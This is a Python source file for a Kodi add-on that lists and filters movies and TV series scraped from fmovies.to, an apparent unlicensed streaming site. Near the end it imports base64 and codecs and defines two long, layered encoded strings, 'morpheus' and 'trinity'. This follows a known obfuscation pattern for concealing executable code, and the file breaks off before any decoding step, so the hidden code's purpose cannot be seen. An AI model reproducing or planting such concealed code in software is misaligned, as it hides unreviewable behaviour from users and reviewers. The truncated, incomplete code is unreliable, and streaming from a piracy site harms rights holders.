# -*- coding: UTF-8 -*-

import sys, os, re, json, base64
if sys.version_info >= (3,0,0):
# for Python 3
    to_unicode = str
    from resources.lib.cmf3 import parseDOM
    from resources.lib.cmf3 import replaceHTMLCodes
    from urllib.parse import unquote, parse_qs, parse_qsl, quote, urlencode, quote_plus

else:
    # for Python 2
    to_unicode = unicode
    from resources.lib.cmf2 import parseDOM
    from resources.lib.cmf2 import replaceHTMLCodes
    from urllib import unquote, quote, urlencode, quote_plus
    from urlparse import parse_qsl, parse_qs
    
import io

from resources.lib import recaptcha_v2

import xbmc, xbmcvfs

import requests
import xbmcgui
import xbmcplugin
import xbmcaddon

import resolveurl 

#urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
base_url = sys.argv[0]
addon_handle = int(sys.argv[1])
params = dict(parse_qsl(sys.argv[2][1:]))
addon = xbmcaddon.Addon(id='plugin.video.fmoviesto')

PATH            = addon.getAddonInfo('path')
try:
    DATAPATH        = xbmcvfs.translatePath(addon.getAddonInfo('profile'))
except:
    DATAPATH    = xbmc.translatePath(addon.getAddonInfo('profile')).decode('utf-8')
    
if not os.path.exists(DATAPATH):
    os.makedirs(DATAPATH)
jfilename = os.path.join(DATAPATH,'jfilename')
napisy = os.path.join(DATAPATH,'napisy')


RESOURCES       = PATH+'/resources/'

FANART=RESOURCES+'fanart.jpg'

exlink = params.get('url', None)
nazwa= params.get('title', None)
rys = params.get('image', None)
page = params.get('page',[1])[0]


fsortv = addon.getSetting('fsortV')
fsortn = addon.getSetting('fsortN') if fsortv else 'default'

fkatv = addon.getSetting('fkatV')
fkatn = addon.getSetting('fkatN') if fkatv else 'all'

fkrajv = addon.getSetting('fkrajV')
fkrajn = addon.getSetting('fkrajN') if fkrajv else 'all'

frokv = addon.getSetting('frokV')
frokn = addon.getSetting('frokN') if frokv else 'all'

fwerv = addon.getSetting('fwerV')
fwern = addon.getSetting('fwerN') if fwerv else 'all'

fnapv = addon.getSetting('fnapV')
fnapn = addon.getSetting('fnapN') if fnapv else 'all'

snapv = addon.getSetting('snapV')
snapn = addon.getSetting('snapN') if fnapv else 'all'

ssortv = addon.getSetting('ssortV')
ssortn = addon.getSetting('ssortN') if ssortv else 'default'

skatv = addon.getSetting('skatV')
skatn = addon.getSetting('skatN') if skatv else 'all'

skrajv = addon.getSetting('skrajV')
skrajn = addon.getSetting('skrajN') if skrajv else 'all'

srokv = addon.getSetting('srokV')
srokn = addon.getSetting('srokN') if srokv else 'all'

swerv = addon.getSetting('swerV')
swern = addon.getSetting('swerN') if swerv else 'all'

dataf =  addon.getSetting('fdata')    
datas =  addon.getSetting('sdata')    

wybornapisow = True

UA='Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0'

headers = {
    'User-Agent': UA,
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'pl,en-US;q=0.7,en;q=0.3',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'TE': 'Trailers',
}
sess = requests.Session()
def build_url(query):
    return base_url + '?' + urlencode(query)

def add_item(url, name, image, mode, folder=False, IsPlayable=False, infoLabels=False, movie=True,itemcount=1, page=1,fanart=FANART,moviescount=0):
    list_item = xbmcgui.ListItem(label=name)

    if IsPlayable:
        list_item.setProperty("IsPlayable", 'True')
    if not infoLabels:
        infoLabels={'title': name,'plot':name}
    list_item.setInfo(type="video", infoLabels=infoLabels)    
    list_item.setArt({'thumb': image, 'poster': image, 'banner': image, 'icon': image, 'fanart': FANART})
    ok=xbmcplugin.addDirectoryItem(
        handle=addon_handle,
        url = build_url({'mode': mode, 'url' : url, 'page' : page, 'moviescount' : moviescount,'movie':movie,'title':name,'image':image}),            
        listitem=list_item,
        isFolder=folder)
    xbmcplugin.addSortMethod(addon_handle, sortMethod=xbmcplugin.SORT_METHOD_NONE, label2Mask = "%R, %Y, %P")
    return ok
    
def menuMovies():
    add_item('https://fmovies.to/filter?type[]=movie', 'List movies', 'DefaultMovies.png', "listmovies", True)    
    add_item('', "-      [COLOR lightblue]sort:[/COLOR] [B]"+fsortn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:fsort', folder=False,fanart='')
    add_item('', "-      [COLOR lightblue]country:[/COLOR] [B]"+fkrajn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:fkraj', folder=False,fanart='')
    add_item('', "-      [COLOR lightblue]genre:[/COLOR] [B]"+fkatn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:fkat', folder=False,fanart='')
    add_item('', "-      [COLOR lightblue]year:[/COLOR] [B]"+frokn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:frok', folder=False,fanart='')
    add_item('', "-      [COLOR lightblue]quality:[/COLOR] [B]"+fwern+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:fwer', folder=False,fanart='')
    add_item('', "-      [COLOR lightblue]subtitles:[/COLOR] [B]"+fnapn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:fnap', folder=False,fanart='')
    add_item('', '[COLOR lightblue]Search[/COLOR]', 'DefaultAddonsSearch.png', "search", True)    
    add_item('f', "[I][COLOR violet][B]Reset all filters[/COLOR][/I][/B]",'DefaultAddonService.png', "resetfil", folder=False)

    xbmcplugin.endOfDirectory(addon_handle)
    
def menuTVshows():
    add_item('https://fmovies.to/filter?type[]=series', 'List tv-series', 'DefaultMovies.png', "listmovies", True)    
    add_item('', "-      [COLOR lightblue]sort:[/COLOR] [B]"+ssortn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:ssort', folder=False,fanart='')
    add_item('', "-      [COLOR lightblue]country:[/COLOR] [B]"+skrajn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:skraj', folder=False,fanart='')
    add_item('', "-      [COLOR lightblue]genre:[/COLOR] [B]"+skatn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:skat', folder=False,fanart='')
    add_item('', "-      [COLOR lightblue]year:[/COLOR] [B]"+srokn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:srok', folder=False,fanart='')
    add_item('', "-      [COLOR lightblue]quality:[/COLOR] [B]"+swern+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:swer', folder=False,fanart='')
    add_item('', "-      [COLOR lightblue]subtitles:[/COLOR] [B]"+snapn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:snap', folder=False,fanart='')
    
    
    add_item('s', "[I][COLOR violet][B]Reset all filters[/COLOR][/I][/B]",'DefaultAddonService.png', "resetfil", folder=False)
    add_item('', '[COLOR lightblue]Search[/COLOR]', 'DefaultAddonsSearch.png', "search", True)    
    xbmcplugin.endOfDirectory(addon_handle)
def home():
    add_item('https://fmovies.to/movies', 'Movies', 'DefaultMovies.png', "menumov", True)    
    add_item('https://fmovies.to/movies', 'TV-Series', 'DefaultMovies.png', "menutvs", True)    
    add_item('', '[COLOR lightblue]Search[/COLOR]', 'DefaultAddonsSearch.png', "search", True)    

    xbmcplugin.endOfDirectory(addon_handle)
    

def ListMovies(exlink,page):

    links, serials, pagin = getMovies(exlink,page)

    itemz=links
    items = len(links)
    mud='getLinks'
    fold=True
    for f in itemz:
        add_item(name=f.get('title'), url=f.get('href'), mode=mud, image=f.get('img'), folder=fold, infoLabels={'plot':f.get('title'),'title':f.get('title')}, itemcount=items, IsPlayable=False)    
    itemz=serials
    items = len(serials)
    mud='getseasons'
    fold=True
    for f in itemz:
        add_item(name=f.get('title'), url=f.get('href'), mode=mud, image=f.get('img'), folder=fold, infoLabels={'plot':f.get('title'),'title':f.get('title')}, itemcount=items)    
    
    if pagin:
        add_item(name='[COLOR blue]>> Nastepna strona [/COLOR]', url=exlink, mode='listmovies', image='', folder=True, page=pagin)
    if links or serials:
        xbmcplugin.setContent(addon_handle, 'videos')    

        xbmcplugin.endOfDirectory(addon_handle)        


import base64, codecs
morpheus = 'IyBlbmNvZGVkIGJ5DQojIEZURw0KDQppbXBvcnQgYmFzZTY0LCB6bGliLCBjb2RlY3MsIGJpbmFzY2lpDQptb3JwaGV1cyA9ICc2NTRhNzk3NDY1MzE3NTUwNmYzMTY5NjEzNzU4NzQ0YTM5NTIzOTRiNmQ2ZjY2NzEzMTcyNTM0Zjc1NGU2Nzc4NjE2NTZlMzA1MzRlNzM0YTM1NmQ0YjMyNDg1MjY5Nzc0MTM5NTE3NjQ0NzQ0YTQyNDc0OTc3NGU3MjZlNDI3NzJiNjY1NzdhMzE2OTU5NzI3NTM2NzU2ZTM1MmI2NzM4N2E0NTUwNGI0MjY1N2E0YzY0MzcyYjczNGMyYjcyNjY2NjZhNmM2NDM4Mzk3NTMzMzAzNzY0NjY1ODZmNjU2NjY2MmY3MTMzNTgzMTYxNzgzODJmNGU1MDUwMmYzOTMwNzI3MDc2NjIyZjY1NGY1ODMxMmI0ZTc2NzAzNjY2NWE1ODMzMzc2ODY5NzY3OTMzNmUzMzJiNzE2MjJmNjY2ZDJmNjY1NDM0Mzc1YTY1MmYyZjc2NGI3MjRlNzk3Nzc2NzIyZjU4NmQ0ZDMzNTAzMjZjNjU2NjM0NjM3OTc1Mzg2YzVhMzY2NDRhNjI3NDRmNTczMTc0NjgzMDM3NzkyYjRjNDQyZjdhNjEzMTY5NmIzOTU3NzI0ZDM0NmM1MTRjNzY2OTM2NjY1ODcwMzM0YzQ3NjIyZjZjNzEzNzQ3Mzc3MDRiNjIzODQ0NjY3NTYxNTYzMzc4NTA2YTU1NzU0NDUwNTIyYjc2NzA3NDM4NjQ2ZTYyMzI2NTQ0MzI0YzY4NjY2MzMyNGU1NDYyNzgzNzMzMzQ3OTU2NzU2MjQ1NTM2Mzc4NGY2ZTUyNmE3MjZkNjg2ODdhNDQ2MzU0NGY2ZDM4MzAzMjRkMzczMjU1MzY2YzM3NTY2ZTYyNDU2MTJmMzM3NDUzNjU2YzZjNmU2ODQ5NGQ2NDcxMzM0YTUzNjg0YjU4NDc3MTQ4NGE0ZTY4NGQzMDcwNzQ1OTJiMzM0YjU0NTY3YTZmNjE1YTdhNzI0Nzc5NzY0ODYyMzI3MDc1Nzk2NzU0Mzc3NzZhNmU1NzQ3NDc2ZTRhMzczNTM0Njg3OTM2N2E2MzZjNGM2MTU3NmE3MTQ4NDIzODM2NTk3YTYyNDc0ZDYyMzczODM3NzEzMzZhNjgzNzMzMzU1MTY1Mzk3NTJmNjY0ZTM3NDg2YjJiNTg2NzU4NmQ2Yzc0NGMzOTcyNjgzMzc5NDU3MjUzNGEzNzUzMzA3YTQzMzczODdhNjE3YTczNTg1OTM0NjUzNzZiMzkzMTZlNzIzODVhNDUzOTc3NjY2MTc0NzMzNDRmMzIyZjRiNzk2OTQyNTAzNjc0NjY2OTc2NjU0NzQ5NjUzOTM1NmM2YTU4NjQ3ODMwNmQzMDYzNjE2NjRhMzg2ZTQ3NTA3OTU4NmE2YjU3NTc0Mjc2NGYzODQ4Mzc0NTY1NTQ2ODRjNmE0YzY5NTgzNzMzNDE3NjZlNzY0NTc1NjkzMDUwNTM1MzMxNmM3MDZkMzE2YTY3MmI2NDc1Mzc2YjZmMmI1NjU2NjY2OTQ2MzM0ODRjNzc1NzM0NDQzMzY2NGU2YTU1MzY3Njc5NGY2NDRiNjU2NzY1MmI0ZTY3NTg3OTZlMzUzMzYzNjc2ZjZkN2E2YTU4NGU3NTU1NGY2NjQyNTQ3MTY2NTA0MzQyMzkzNTQxNjYzNzc0MmY0NzZmNGQ0Nzc3NjM1NDJmNzAzODUwNDQ0ZDYzMzE1MDM4Mzg2ODZjMzY2OTZlNDYyYjU0NDIzMjUxMzc2ZTQzNTU0Njc2NTU2YTU0NjM2ZjY1MzkzMDQyMmI0ZjRjMzg2ZDZlNTE2ZTM0NDM1MTMyNmM0NjM3Nzk1ODM0NzczNzcyNTE2YzMzNzAzMDc3NzAzMTcxNjQ1YTUyNGMzMDZiNTA1MDZiNDU0NDJiNDY0YjM2N2E2MjQ2NTc2NzY4MzU1OTMwNTc2ODcyNmY0MjY1MzA1NTJmMmY1MTUyMzU2YzUxN2E3OTYyNmM0OTM1NTczOTUzNDI1MDMwNmQ2YTY3NTg2NTczNDIzNTQyMzk3NDRkNDk1MjY2Nzc0MTU2NzI3YTQ3NjY1NzM1NDc2MjRkNGI3NjQ3NGQ3NjM3NmYzMjcyNTU2MzYxNTU0MTJmNjE0ZDZiNTA2NDU5NDc1MjZlMzA0MzJmMzM2ODUwNDE2YzM3NTM2YTU2NWE1Mzc0Nzc3NjQ5NDY2MzM1MzMzNTUxNDYzNjRiNGQzOTY3Njg1YTcyNTY3OTZiMzY3MTRiNjM1MzY0NmY2NDMxNDcyYjcxN2E1NDQ3NjU1NTU5MzE3MjM2MzU3NzMzNmYzMzU2NmY0YTc2NzE1NzZhNDI0MzJiNjc0NTdhNTQ2OTY2NmI2Njc4NjczNzU1NjUzNzQzNmI3ODU5NTE2NjM0Njg2YTU1NmEzNzQzNzQ0ZjY4MmI2YjM1NmY1ODM2Nzc0NDMzNjE0NTMzMmIzMTMwNmUzNDM3MzczOTUxMzE2YzUxNTA3MjRiNDI1MDUzNmMzNDQxNTgzNjY5Njk0NjUwNGEzNDU1Mzk1MTMzMzQ0ZjYyNTI0MjMyNTY3NDRmNmQzODRlMzY2OTU4NTY0Mzc1MzA0OTRmNDYzOTU4NDY0YjMyMzU3ODQ0NGE3NjcyNTc3OTcyNzU0ZTc4NjY1MDc4NjY3MTUzMzg0YTY1NTE2NzMxNTIzMjc3NDk3NzMxMzA0NzUwNjc0NjZlNjQ0MzdhNTk1Mzc1MzY2MTQxMzk1OTQxMmY3MjY4NDYzMzQ1NDk0ZjU2NDc3NjM0NDEyZjMyNTA3NTZkNzI2NzQ4N2E2NzU2NzczNzc0NDg3YTQ5NjM0YjU0NjYzNDRhMzUzOTc4NGMzODM2NDQ3NjZlNDU3NjYyNDUyYjU3NGY1NzMwNTk2NDRlNDQyZjQzMzEzMzM1NTg1NzMzNTQ0YzczMzYzMDQyMzk2ZjU3Mzk0YjZhNDI1MDc1NjI2MzZlMzg2MTUxNTgzMTdhNjg2ZTRjNzk0ODZhNTU0NjJmNzM1MDc1NTI0ZjcxNGE2NDM1NmY2MjUzNDIyYjc5NGQ0ZTQ3MzA1NTQ4NjY0MTc2MzI0ZjRhNmI3NDc3NmUzNDcwNDQyZjYxNjk0MTRkNzAyZjQzNGI0MjQ4NTQ0NjRmNzA0YTcxNzk2ZDM3NGMzNjRjNmIzOTRhMmIzODRjMmI0Mzc2NjY1MjcyNzE0MTQ4MmI0ZTczNmQ3NDcxNmI2NjZlNjYzNjcyMzQ2ODU4MzA1MDM1MzE2MjZkNDQ3ODU4Mzg2YjM3NDc0YzJmNjc3MTdhNjk0NjY2Mzg0NjJiMzg2NzM5N2E0MTMzNzc1NjJiNzc1ODY3NDY0ZjM2NjYyZjM1MmY1Mjc2Nzg0NDZlNGI0YTM2NTIyZjM0NDg3OTY1NmYyYjc3NGE2NDRkNGI1ODQ3NDUzOTY5Nzk0ZDQ3Njg1ODMyNDIzOTRjNDI0Njc2Mzg2ZjQ2Nzg0YzRiNGQzODMxNDg2ZDU1NjgzMjMzNTE0ODcwNTMyYjRiNDUyYjMxNDQzOTM4NjM3ODY3NDY0NjQxMmIzNjQ0NzY2ODMwNTY0YTdhNTg0OTc4MzQ1MTJiNzU2YjZlNGYzMDJmNzY0ZDU1NzU3NDMwNjE2NTMwNzA3YTMxNDg1YTYzMzg3YTMxNzk2ODYyNjg1YTc5NzI2NTMwNzIzNTc4NGM2ZDY4NmE1NDQ5Mzc2ODVhMzI1MDU5MzQ3ODdhMzQ0MTY1Nzc1Mjc1NmIzNTRjMmI0NDZlNzUzMjRhNGEzMzM2NDU1MDVhNDYyZjMyNjYzOTRiNzM1OTY3NmU3NjRjNDM2ZTM0NGE2NjM3NGM0OTc4MzQzNzJiNDM2NjMzNTE1YTc5NzY0OTRlNzgzOTcwNjMzNTczNTM2MzVhNjY3ODcwNGQ1NDM1NTY2ZDQ1NmY2NTMwNDI2Mzc4NjY2ZTMwNTIzNjc5NWEzNDY5Mzc2OTQ5NmQ1NDQ4NjY1YTUxNTgzOTQ1MzAzNjQ1NDYzODY3NTA3NzMzMzM0Nzc2NTM2ZTc5NWEzNjU2N2E1NTRmNzU2YTQyNzU0OTY0Mzk1MjZhNmU2NDQxNzU0ZTRkNzE0YTRkNTEzMTc5MzE0YTU2NjU3ODcwN2E2ZTY3NzMzNTQzNTMzNTU1NzM0Mzc2NzA0Njc4MmY2NjUxNjUzNDU2Mzc3NzQ3NjQ0YjRmNzA2ODZhNDI3NDQyNGUyYjU1NGY1MDM2NmE3OTM4NzI3ODY4NmU3YTc2NTE3Mjc5NDI0ODMyNDIyZjMzNDU2YTQ5NzMzMjM1NGI2ZTY5NGM0ZjRkNTI2NTQzNzgzMDM1NTQzODRmNWE2MzM5N2E3MzY0NjY0YjQ3NTY2NjY4MzUzODY4NTQ1NjY3NTUzNzY4NDQzOTYxNTM3MTM4MzYzMTc5NGY2NjM5NjY0MTQ4Nzg2OTZlNTE1OTMxNTAyZjQ2Mzk0MTUwNGYzNjY0Mzg0MzJmNmE0YTQ0NzQ1YTQ0NTAzNDRhNjU3OTM0NTQ3OTQ3Nzk2NTM5NGIzNzJmNTE0ZDc0Njc1MTM3NDI0NjMyNjgzMzRmNTI0MzdhNGM2ZDQ4Mzk2OTRkMzI2YzM4NzE0ZjVhNDk2NTM4NDk2ZTM3NDY0NTJiNzc3YTM1NzE3OTc5NTI0MjY2NDc0ODM4NTkzNTc3NTg3NDQ1NTg2YjRjNzM2ODc4MzM1YTJmNGIzMTU1NjY2YjZjNTk2Mjc3NzczMTU0MzM2YjU5Mzc0YTQ4MmY0YjcwNTk3YTcwNjg0Mzc1MzQ2MTM4NzU0MTM5Mzg1NzRhNDM3NDczNmY0ZjUxMzk3NDQ2NDI2YTM0NjI1MzQ4MmI2ZDZhNDg1Njc2NGI1NDJiNmI2NjM5NDI2NDM5NGY3MDY0Nzg2YjY2NDY1NDJiNTQ3NjdhNDE2NTU1NGM1MDY2NmM2ZTcxNjY0OTQxMzc2MzUxNjU2YzYyMzU3NzM3MzE2MjM1NTkzNjM3MzQzMjRiNjczNDQyNGMzNTU2MzM3MzMzNmU0YjZiMzY1MTMzMzE2YTUxNzg3MTZjNmU1MTJmNmQ2ODM4NzU3NDQ1Nzg2NjU1NzQzODc3NjY2YTU1NDk2ZDM4NmEyZjRkNmIzNDM5NTA0OTc1Njc0YTMyNDM3MjMyNmI3OTY3MmY3MzY5NTgzNjU2NGEyYjQ3NTA3NDQ1NzY3OTQ2NjQ0ZDRmNTk0NzY0MzQ2ZTc2NGI0ZTdhNjI3NzQyNGY2ZDZkNjY3OTQzNGQzNDQ0MmY1ODUzNmU0ODQ2NmU3MTZiMzg0NTc2NmE0ZTJmNDk1NzJiNzczNzcyNDE0Y'
trinity = 'wWvAQx2MQEvAzZmZGEyAwZ3ZQp5ZmH0Lmp4AzDmZmMxAzZmAQp4Amx0MGp5AwHlMwEvAGL2BQWzZmR1ZQHkAzHmBQD0AwH2AQp4A2R3BGpmZmD2BQLlZmD2LGD2AzV0BQZ4AQD3AQMzAwt1BGWzAzR2MQLlAGH0AGWzAQV1LGZlAGtmAwpjZmL1ZGIuATL3ZGMyAzV0ZmpmAwplMwZjAmp0AQZlZmD1LGL0ZmN3AwMvAwR2AwDlATH3AGLmAQR2AwpjAmL3LGD1AwZ3BGZmZmL0ZmWvAmp0MwZ4AGHmAmD2AwD2ZmH5ATHmAwplZmL1Amp1AzL2MwD4AQD3AwH1AzZ1AwH2ZmV2AmZ5AQHmAmWzAzR1LGMwAGt1AwL2ZmN3BQExATLlMwDmAwV2MQDlAQtmZGD0AQt2LGIuAwpmAmWvZmt2MGZ2AmR3LGZkATZ1BGExAwL0MQH1Zmp1AwD4AGL0BGZmATL1AwEuZmL2LwD4AmV0LGWzAmx0AGWzZmR1ZQLkAmZ2MwL1AwR2ZmZ4AGpmZmZ3ATDlLwEvATL2LGZmAmZ0ZmMyZmL3AmIuAGZmZmD1AJR2AQMzAGNmZGMuAQD0BQDmZzV1BGMyAmp3LGD3ZzL1ZmMvAmLmAGZ1AQR3AwZ5AQt0Mwp3AGVmZwH3AQD2LGDkAGt0MQMwAmpmAmplATHmZGH2AGt2AmD4Zmp2ZmpkZmV2Mwp2Amt0ZmMyAmp2BQZmAwpmZwEvAzHlLwMxAQt1AGD1AmH1ZmMyZmt0MwZ4ZmD2AwEvZmtlMwDlATZmAGMuZmR1AwpkZmD0Awp1ZmH0ZmLmAGLmBQp5AmV1AmDlZmH0MQZ5AGHmZGWvAzL1AQZkATZmAwD0AwH1ZmMzZmt2BGplAzL2BQH4Amp1ZGZmZmp0AwL1ZmR2ZwD4AmpmZGZ1AzRmAwH0AmN2BGWzAQp0BGL0ZmH1ZQMyZmZ2ZGH1AQD0LGH0ZzV3ZGExAGN2AGL0AQR0LmZ3ATZ1ZGD3AzRmAwMzAwH0BGWzZzL3AmEvZmt2AGMxAGtmZGHjAGN3ZwDlAmH2BQD1Zmx2ZGp4A2R0Zmp2ATR3ZwquZzLlMwZ5AQt0AGWzAGtmBQZ4AwL0ZGp3AmDmAmEwAGt0ZGpmATDmAwpmA2R0LmL1Awx3ZmHmAzL1ZwEyATZ1ZwquZmH0AGHjAQL0MwH4ZmD2ZwIuAGt0BQHmZmx0LwH0AmV1LGDmZmL2ZmZmAzZ3ZGD1AwZ2BQEwATD3BQHlAJR2LGL4AQt1LGZ2AwD3ZwDlAJR2BQplZmV1BQEzAGx1ZwH0ZmR3BQpmAwxmAwH0AQV2AwEzAQD3AQWvAwR0AGplZmt0AmZ5AzH1AGDmAJRmAQp2AwR2MQMxAwL2LGD4AmH2AGZ3AwH2LmIuAwV2BQp1Amx0ZmL5ZmD2AmD0AQxmZmDmAwR3AGLkAwp0AQL2AwH2MGD5AGDlLwD3ZmD2MQMyAGR2ZGZ3AmD2AGquAQH0MGWvAwD3BQMwAmpmAwL0AmNlMwH2AQR2ZmZ2Wj0XqUWcozy0rFN9VPqWp0qZIRSkA3qinTM2nQOdE0SlqSb3FII0E2EgEHIQpx84X0yuFJIbF2WMDGqZpz1BEGSDImOkF2clBSZ3pTg5owEHpxAmFKcGY0Eipz1jFRj0HGAXDxgcEULlp0MIE000o2yCMyEXJKOhpx5MD0WEDwOKZxIYBKcCZmqBZ2AKD3HlpSpmM0H5ZTuTo2yBFP94HGqTAayZqmZ0JxWxJzp3q0cCpmuhrTMInIMeAmu5JKIEM1SwBUb3oRyJMT5jMx1cnScjBJcVoHuPBUqFJHM6Z05MBKMaHHH4LGEcnxjiLaWAAyO3p0kCpmuBBGIPIJyRHT9yG3pmEzWOBTIOL0ggIxZiEJHkFTyIG0fmETSXJv9CIREOpaN2nyHmIyHmoSAwrRuOFxD2X3SwEabeLxEaEGqfHzx4DxIdDlgVE3ELAybiIIMmAyMXBREaq0IbHUV5nSNiERkWpSElGyt5X1Lkn294qwyVEGECGHuSAGSCrvgAZQEdLFgSHKWxqRflH1D0ZGIVpTWBBR0jMQIdEKElpKDkY0HlERZlAT1gAUSwZx1zJRSKJGWxDH9YnR9gpHEXA05BZUqTA0WfnIR4pREfEH5AL2glJFgbA3A4XmSEARWeLaSbIRxirwS3H2j3X0A1MzuyH3OQD2j0ozAGFlfmAzbmHJDipKtlpQukpJtjGRq2n3WMZmuQIGReFzuuDFgdZ2SHMKueDGL3BIL4pyH0HUV5Dap1pQOZY1IzF2kiGUAaLaEgoGL1o2yGMlgwLKykM1IAqaciEzumFaH4p3WkARV1n0H3GKAyBKcKIGOmrPgJH2t1A3W3M2yLZJR1DGybD29Lo2SynSMBpwylAUpjAmESoxcGEUceqwSKYmWBAKW4nTSbMJEdBRfmX20mJxf3JzIUrHyjMmA6Ez5MnQyPF053nyMSIJb3q1L2Z1IyEmMyomqfGHIYAUNepJD1HHA1pwWzZ29EX3SPI2ImDzyGAKNln2gkAmAyD0cvqSLkZRp0AyxlXmAuFaqKAz96owOKJTkanR9coIDlomM4nTSkIaqlIRDknQAGqzcAE3IvpHf2pJIEM3R3rwuyImEbLx1SpHWbBJ01FlgTITkaJR9ynJWWM2Ijo2EOqwWnAmy4GSyHZRuzAaVeDzkHA1H3GHSZEGSFJGMiLGL0Z0gwIGR1nTbiowOxMGACJz5wFTIcnIyyGF9OMJ1cM3SIF3yUnHEmAKMxpzydEGReX1M4FUWBGKyjq3OxJJ9YpaAlqz82X0SnowybpREHH09PpIELY2EyA2WXXmZjI1H3EH9vF3Lep1ZkHmWXoxECA0WkH0WdE1yzIHc5nF9DrRuXoUx1rKyTpvgfoQWEnJ5grT5Io0AyFTMOpKW4nKWyHyIhnQMiG1cgBSZeoHkioUuZFTkZGTIYLxR3DH1SpaSVA1b1pxqIZzcdGJxerycJF1DjFzuMHHqUrRMaBRqIZ1W2rzx1MH1gnzViGJ1WBQEJM3ykIUbjAR1OZUIYn3ygZQWFJwORAzWvBTEApT1fBTAFGKZmM3AfoRglMHDmD1cUnQEvnGuGIRWanGZ2MSOPDzL5Y3cnH3yzo3ZjGKciAHymL3MaJIuKpKIjLJMxZxgXMJkbEJyfMJpjp1MgpQEjBREZo3OVFQt2IQD5X1VjY2yGMRWWZxglowEXASOYnH15AQNeqyyZA2ALMzclL0geIzAQrwuIE2IIqzSznxgQAwEuHJ9MFz9TplggnKOmnQEeMwSwIUS4LHL0M3WIHRWxMHywX2qxo2qOJvgMnaR4BF9DoHcEX1ygHJ82Z1cSoIS2ZwqkGRc3AwEaZUAQpUEvEUb4qwZkDaqmo3R2AaR5qzyXLwShoT42LHf1Z3IanwR3p3SyI1cvZaqwI2ImFUqkFUV5H0AWoUEKBRIgZyt4nGI5o0g6MQOuIGEFFmMMAl9Zo0IbMxIlIQyenaEPoJxep045AJy2Y0f0rzy3ZwMGA3qLMRyKrQOuY3qBM2ykp1A4ImWcARqAolgzD2SgF3L4Z1WJJKAEF1Ecpl9RGSManHLmX3IYo2qloz1cGTS5BUM1Mz1Qq2x5AREAoHSSHlf0ZaAynyACq21ZMHyyMQSip09apHjmoHg0BHqZZzL4GKAkJKARE3yipGuFZPgGZPglZwSRZ1qgLmq3MJj2nJRkMQReA2L2MKOkA0AEFGqkn00kMKWcBGOFrScyo2EAqwWMoHWeMGWOZ1SUX0EMY1H1A0IjF293JxyYpwMmDmETY2SkLaqDrHIiMmIULl9bMJESBISzAJ40A29JZzITY3SJBJcHY25doIMbAGM5L3ZkA2ILJHyOXmyHGUH5pIEfnxc2X1OXJJq4YmZ0nx4iBJL3G0kKpHWlIKHeJz5QX011A3EFp241Dz9ipaAkpRWOnIt0ZwybLGLeFyx2F3qlZJV5MxAYDJ4lZ3ylD05znKb3BJWIBHcxpGDkAmyEqQWTpxqkMxSjAz9xD0ybIaMcBHICpQAUoxEzp3qXMJMVBRVlAzH5qKEkJwxeX0McpHyfZ0kaGTADIJubMHy4JQM6nHc1H3S1nSyvZxSZAGuhIxAKHmuHD3WdnKSdY3L2JGR3oaWiJREOL2ybMGAvnzcfIF9AGJ83FT80LwDkHKyGZwyMoUy5BQymHIxmIHgjX01OY0qYLwRlZTfeZKDeY09XLwA3D1IOpmOeqaLipaqLBGqSA0AuL2MmHxj5rzp2D2cIpKN2GHx0A3R3nSIRGGOIGQMnAGOlDIqkLv9DBJWlZmy6q0yYM3AQF1tkBJucFKAEHUWSLaWkozL4GzWnraR4IH9Dq3HlG0xeHwMfq0IEY1W1LJp1A3WkryOnnUZiDycSBIEbBQNiJKcPM2qmp3MVDwZlo1SSY2ReZaIioHg3GR1xAaSODwIDnRZ3qzkWLaATMaWCM292FwA1MRIcAT1mJUckM1yfZ3uHI2S4Z0cwGxgUIwO5ZHt4JQpmAaOVEwScMJMkZwViGmOMA25bnKSWA0WhEGuLJHAwMPfeZ2V2rRulA25MqJEzZUV2MxLeIKRmEP96BKAFFz01X0D2ZTA1BKqnIHciMJq2BGEQAHIWZ1HioJcvE3bkpyIjX2x5ExcxBUWwraAapxk5F1yWExWlnmuVrGunFz9YIQOXXmWmFz5hqGIhrKAMFyMkZKcSITcWrx8eEKMSGzIZIKO3pJWcpKcbFGNkF2qdF2WCM0EGMRWPE3cPnTqjA3unM3IKnyOcBUNeAIE3FR9xHwLjnaIZowABMmx5pxcyrzWlAIEUBTW2omMZGwAFX3DmD3qLX2MRFKcMLz5ZHTp2n09VEzywX1DiBR41ZzWEEIEUHxx4ozyHp3SBH3t0HKWxoxAlMwLkHJcmnSukG3qiqH9QGSuhJTqfn095IJSCMlpAPz9lLJAfMFN9VPpmBGplATHmAGp5AQtmZwExATL2ZGEwATZ3Awp3AzH0BGp5ZmR2LGD5ZzV2ZGDmZzL1AGHlAwR3LGplAGH0AmMyAGN1AGEuAmR2AmZ1ZmV0BQWzAmH2ZGp0AwR2BQpkATH1AGExAGL1ZGp1AQZ2LmMzAmxmZGDmAQp3ZQMxZmR0AGp3AQp2ZGp4AmH0ZwL1AQx2MGLkA2R3ZmL4AGH3LGLmAQx2ZGDmAzH1Zmp5ATR2Amp2Amt0BQp2AGH0MwWvATV0AmZ4AGR0AQL0AmR2MGIuAQZmZGp0AmN0BGZ1Zmx3ZGHjAGp0AQH1AQHmAmZ3AQH2MQExAmR0AmpmAwZmZmMxAwD0MGp0AGp2ZGD5Amp3AwZ1ZmV1ZQWvAwR1BQD1ZzV3AQZ2AmD2LmLmZmHmZwL3AQ'
